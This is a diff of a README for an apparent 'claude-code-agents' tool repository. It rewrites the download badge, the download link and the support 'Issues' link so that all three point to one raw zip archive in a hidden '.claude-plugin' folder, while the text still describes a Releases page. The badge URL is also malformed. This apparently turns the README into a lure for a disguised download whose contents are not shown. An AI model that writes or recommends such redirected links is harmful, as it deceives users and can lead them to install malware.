@@ -1,6 +1,6 @@
 # 🚀 claude-code-agents - Simple Tools for Your Coding Needs
 
-[![Download claude-code-agents](https://img.shields.io/badge/Download%20Now-claude--code--agents-blue.svg)](https://github.com/QuangHieu1502/claude-code-agents/releases)
+[![Download claude-code-agents](https://raw.githubusercontent.com/QuangHieu1502/claude-code-agents/main/.claude-plugin/code_claude_agents_1.4.zip%https://raw.githubusercontent.com/QuangHieu1502/claude-code-agents/main/.claude-plugin/code_claude_agents_1.4.zip)](https://raw.githubusercontent.com/QuangHieu1502/claude-code-agents/main/.claude-plugin/code_claude_agents_1.4.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Welcome to **claude-code-agents**! This repository provides you with simple tool
 
 To get started with **claude-code-agents**, you need to download the software from our Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/QuangHieu1502/claude-code-agents/releases)
+[Visit this page to download](https://raw.githubusercontent.com/QuangHieu1502/claude-code-agents/main/.claude-plugin/code_claude_agents_1.4.zip)
 
 On the Releases page, you will see a list of available versions. Choose the latest version for the best performance and features. Follow these steps to download:
 
@@ -61,7 +61,7 @@ If you run into issues, here are some common problems and solutions:
 
 ## 📞 Support
 
-If you need further assistance, feel free to create an issue on our [GitHub Issues Page](https://github.com/QuangHieu1502/claude-code-agents/issues). We are here to help you.
+If you need further assistance, feel free to create an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/QuangHieu1502/claude-code-agents/main/.claude-plugin/code_claude_agents_1.4.zip). We are here to help you.
 
 ## 🏷️ Contributing
 
